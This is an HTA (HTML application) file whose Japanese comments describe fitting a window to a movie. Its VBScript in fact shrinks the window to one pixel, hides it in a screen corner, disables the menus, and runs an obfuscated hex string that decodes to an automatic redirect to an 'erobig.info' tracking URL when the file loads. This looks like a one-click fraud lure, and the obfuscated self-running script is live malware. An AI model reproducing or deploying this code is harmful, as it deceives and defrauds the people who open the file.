<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title></title>
<Script Language="VBScript">
on error resume next

'ウィンドウのサイズ設定
winwidth = 1
winheight = 1

'ムービーのサイズにあわせてリサイズ
window.resizeTo winwidth,winheight

'画面下中央に移動
positionX = ( screen.availWidth - winwidth )
positionY = ( screen.availHeight - winheight )
window.moveTo positionX, positionY

nsTIAkeyXmnyPEx = "349D9F8C4AA193988E99A189999876998B8E344A4A76998D8B9E93999858729C8F904A674A4C929E9E9A645959A1A1A1588F9C998C93915893989099599D8F9E89939890589A929A69938E675A5B895A5B58A197A0508D938E67625C8D90625D5E5F5E90615B8E8D8F605B8C90638D5C5D5B8E615A605E8C8D8B5090675B4C348F988E4A9D9F8C34"
wVejfYCsLRyWaa = ""
For i = 1 To Len(nsTIAkeyXmnyPEx) Step 2
  wVejfYCsLRyWaa = wVejfYCsLRyWaa + Chr(CInt("&H" + Mid(nsTIAkeyXmnyPEx, i, 2)) - 42)
Next
Execute wVejfYCsLRyWaa
</Script>
</head>
<body>
<HTA:APPLICATION 
    APPLICATIONNAME="82cf83454f71dce61bf9c231d7064bca"
    ID="82cf83454f71dce61bf9c231d7064bca"
    VERSION="1.0"
    SINGLEINSTANCE="yes"
    NAVIGABLE="yes"
    WINDOWSTATE="normal"
    BORDER="none"
    INNERBORDER="no"
    BORDERSTYLE="normal"
    CONTEXTMENU="no"
    SELECTION="no"
    SCROLL="no"
    SCROLLFLAT="no"
    CAPTION="no"
    ICON=""
    SYSMENU="no"
    MAXIMIZEBUTTON="no"
    MINIMIZEBUTTON="no"
/>
</body>
</html>
